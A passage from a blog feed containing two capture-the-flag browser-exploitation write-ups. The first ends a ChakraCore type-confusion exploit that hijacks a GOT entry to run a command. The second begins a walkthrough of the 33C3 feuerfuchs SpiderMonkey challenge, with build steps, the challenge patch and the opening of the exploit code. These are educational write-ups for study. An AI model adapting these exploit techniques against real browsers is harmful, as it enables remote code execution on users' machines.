    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] write_got @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] write_addr @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe3a100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] system @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// now set up our command &lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/bin/xcalc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// write the command into a Uint8Array&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;   

    &lt;span class=&quot;c1&quot;&gt;// overwrite memmove with system&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memmove_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memmove_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;upper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// GIMME SHELL NOW&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The original exploit code overwrites two GOT entries ( &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;memset&lt;/code&gt; ) and tries to call &lt;code class=&quot;highlighter-rouge&quot;&gt;execve(&quot;/bin/sh&quot;, argv, envp)&lt;/code&gt;, which is more complicated ( but more stable, since it doesn’t need to know the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;libc.so&lt;/code&gt; ). Here I choose a more simple way to achieve RCE.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;The patch removed the code that does the type checking inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray::ConcatIntArgs()&lt;/code&gt; function. This make us able to tamper the data type of &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt; by defining the property of &lt;code class=&quot;highlighter-rouge&quot;&gt;Symbol.isConcatSpreadable&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here we modify &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt;’s data type from &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt; and trigger the type confusion bug. We can later exploit the bug to:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Leak an object’s address&lt;/li&gt;
  &lt;li&gt;Fake an object at an arbitrary address&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To obtain the arbitrary read/write primitive, we fake an &lt;code class=&quot;highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt; object, modify its data buffer’s pointer and obtain its object handle. Later we can use this handle to read/write memory content. We then leak the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;libChakraCore.so&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;libc.so&lt;/code&gt;, calculate &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;’s address and overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;memmove&lt;/code&gt;’s GOT to do the GOT hijacking &amp;amp; achieve RCE.&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;

&lt;p&gt;Learn a lot from this one. Type confusion bugs are very common vulnerabilities in the real-world softwares, and this challenge is a great example of how it will affect the security of the modern browsers.&lt;/p&gt;

&lt;p&gt;Next stop: &lt;a href=&quot;https://github.com/saelo/v9&quot;&gt;V9&lt;/a&gt; !&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/isConcatSpreadable&quot;&gt;isConcatSpreadable on MDN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore&quot;&gt;Building ChakraCore engine&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf&quot;&gt;The Secret of ChakraCore: 10 Ways to Go Beyond the Edge&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf&quot;&gt;The Origin of Array [@@species]&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://mashirogod.dothome.co.kr/index.php/2017/01/07/first-step-to-browser-exploitation/&quot;&gt;First Step to Browser Exploitation (Korean)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Pwnable" /><category term="Javascript" /><category term="Plaid" /><category term="Edge" /><category term="ChakraCore" /><category term="Browser" /><category term="type_confusion" /><summary type="html">Introduction</summary></entry><entry><title type="html">Learning browser exploitation via 33C3 CTF feuerfuchs challenge</title><link href="http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="alternate" type="text/html" title="Learning browser exploitation via 33C3 CTF  feuerfuchs challenge" /><published>2017-12-16T05:24:00+08:00</published><updated>2017-12-16T05:24:00+08:00</updated><id>http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge</id><content type="html" xml:base="http://0.0.0.0:4000/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;So I’ve been playing with the browser exploitation recently, by studying some browser CTF challenges. So far I’ve tried &lt;a href=&quot;http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16&quot;&gt;qwn2own&lt;/a&gt;, &lt;a href=&quot;https://tradahacking.vn/hitb-2017-writeup-sgx-browser-5c1c48e0d6fe&quot;&gt;SGX_Browser&lt;/a&gt; and &lt;a href=&quot;https://github.com/saelo/feuerfuchs&quot;&gt;feuerfuchs&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;qwn2own and SGX_Browser are both great for getting started with the brower exploitation. However, they are not “real world” enough, since both of them are small, simple QT-based browser with custom Javascript extensions. To learn the real world browser exploitation, it’s better to start with &lt;strong&gt;feuerfuchs&lt;/strong&gt;, a Firefox-based browser pwnable challenge created by &lt;a href=&quot;https://twitter.com/5aelo&quot;&gt;saelo&lt;/a&gt; for the &lt;a href=&quot;https://archive.aachen.ccc.de/33c3ctf.ccc.ac/challenges/index.html&quot;&gt;2016 33C3 CTF&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This write-up is more like a “learning note” stuff. Here I’ll write down my learning process, including how to debug the SpiderMonkey Javascript engine, how the vulnerability works, how to exploit the vulnerability, …. etc.&lt;/p&gt;

&lt;h2 id=&quot;pre-knowledge&quot;&gt;Pre-knowledge&lt;/h2&gt;

&lt;p&gt;Before we start, it is recommanded that the reader read this amazing &lt;a href=&quot;http://www.phrack.org/papers/attacking_javascript_engines.html&quot;&gt;phrack paper&lt;/a&gt; ( also authored by saelo ) and have some basic knowledge of the Javascript engine exploitation technique, especially the “Exploiting with valueOf” part, cause we’ll be using that later.&lt;/p&gt;

&lt;p&gt;TL;DR:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.... The rules governing the conversion from object types to numbers 
(and primitive types in general) are especially interesting. 
In particular, if the object has a callable property named &quot;valueOf&quot;, 
this method will be called and the return value used if it is a primitive value.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For instance, variable &lt;code class=&quot;highlighter-rouge&quot;&gt;hax&lt;/code&gt; has the following &lt;code class=&quot;highlighter-rouge&quot;&gt;valueOf&lt;/code&gt; property:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'hello'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When the Javscript engine tries to convert &lt;code class=&quot;highlighter-rouge&quot;&gt;hax&lt;/code&gt; into an integer, it will first print out the message “hello” to the console, then return &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; as the integer value of &lt;code class=&quot;highlighter-rouge&quot;&gt;hax&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/example_valueof.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So If we replace &lt;code class=&quot;highlighter-rouge&quot;&gt;console.log(&quot;hello&quot;)&lt;/code&gt; with some malicious code ( e.g. modify an array’s length ), something bad might happen. This concept will be applied to the exploit of the challenge later.&lt;/p&gt;

&lt;h2 id=&quot;environment-setting&quot;&gt;Environment Setting&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Ubuntu Linux 16.04 64 bit&lt;/li&gt;
  &lt;li&gt;Firefox 50.1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’m also using &lt;a href=&quot;https://github.com/hugsy/gef&quot;&gt;gef&lt;/a&gt; to debug the SpiderMonkey Javascript engine.&lt;/p&gt;

&lt;h2 id=&quot;building-and-debugging-the-spidermonkey-javascript-engine&quot;&gt;Building and Debugging the SpiderMonkey Javascript Engine&lt;/h2&gt;

&lt;p&gt;Since the challenge is to exploit the Javascript engine, we don’t have to debug the entire Firefox browser ( that, my friend, will be a huge pain in the ass ). Instead we’ll just build a JS shell and use it to run the exploit.&lt;/p&gt;

&lt;p&gt;According to this &lt;a href=&quot;https://wiki.mozilla.org/JavaScript:New_to_SpiderMonkey#Build_the_js_shell&quot;&gt;link&lt;/a&gt;, we can build the JS shell ( with patch ) by using the following commands ( remember to copy the patch file into the directory first ):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd firefox-50.1.0/
patch -p1 &amp;lt; ./feuerfuchs.patch
cd js/src/
cp configure.in configure &amp;amp;&amp;amp; autoconf2.13
mkdir build_DBG.OBJ 
cd build_DBG.OBJ 
../configure --enable-debug --disable-optimize
make # or make -j8
cd ..
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that, we can just use&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef --args build_DBG.OBJ/dist/bin/js pwn.js
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;to debug the Javascript engine and learn how the exploit works.&lt;/p&gt;

&lt;p&gt;Now we’re all ready, let’s get started !&lt;/p&gt;

&lt;h2 id=&quot;analyzing-the-vulnerability--the-patch-&quot;&gt;Analyzing the Vulnerability ( the patch )&lt;/h2&gt;

&lt;p&gt;Let’s start with the &lt;a href=&quot;https://github.com/saelo/feuerfuchs/blob/master/feuerfuchs.patch&quot;&gt;patch&lt;/a&gt; first:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;........................
... ( other patch ).....
........................

 /* static */ const JSPropertySpec
 TypedArrayObject::protoAccessors[] = {
-    JS_PSG(&quot;length&quot;, TypedArray_lengthGetter, 0),
     JS_PSG(&quot;buffer&quot;, TypedArray_bufferGetter, 0),
+    JS_PSGS(&quot;length&quot;, TypedArray_lengthGetter, TypedArray_lengthSetter, 0),
     JS_PSG(&quot;byteLength&quot;, TypedArray_byteLengthGetter, 0),
+    JS_PSGS(&quot;offset&quot;, TypedArray_offsetGetter, TypedArray_offsetSetter, 0),
     JS_PSG(&quot;byteOffset&quot;, TypedArray_byteOffsetGetter, 0),
     JS_PS_END
 };
 
........................
... ( other patch ).....
........................
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the patch add &lt;code class=&quot;highlighter-rouge&quot;&gt;setter&lt;/code&gt; to both &lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt; property in the &lt;code class=&quot;highlighter-rouge&quot;&gt;TypedArray&lt;/code&gt; class, which allow us to set the &lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt; ( starting point of the data buffer ) and the &lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt; of a &lt;code class=&quot;highlighter-rouge&quot;&gt;TypedArray&lt;/code&gt;. However the patch has also handled the boundary check for &lt;code class=&quot;highlighter-rouge&quot;&gt;offset&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;length&lt;/code&gt; as well, so we can’t do something like &lt;code class=&quot;highlighter-rouge&quot;&gt;tarray.offset=10000&lt;/code&gt; and use out-of-boundary (OOB) read/write to exploit the service. We’ll have to find another way to exploit the vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;analyzing-the-exploit&quot;&gt;Analyzing the Exploit&lt;/h2&gt;

&lt;p&gt;We now start analyzing the &lt;a href=&quot;https://github.com/saelo/feuerfuchs/blob/master/exploit/pwn.js&quot;&gt;exploit code&lt;/a&gt; that saelo wrote for this challenge. 
The exploit function start at line 233:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Allocate multiple ArrayBuffers of the largest size such that the data is still stored inline&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buffers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;buffers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// view is our TypedArray&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Trigger the bug first time to leak the data pointer of the following ArrayBuffer&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;copyWithin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To understand why the bug is triggered, we’ll have to dig into the source code of &lt;a href=&quot;https://github.com/mozilla/gecko-dev/blob/c64d600a96280475b6306a3b1ff933431c572784/js/src/builtin/TypedArray.js#L156&quot;&gt;copyWithin&lt;/a&gt;:&lt;/p&gt;

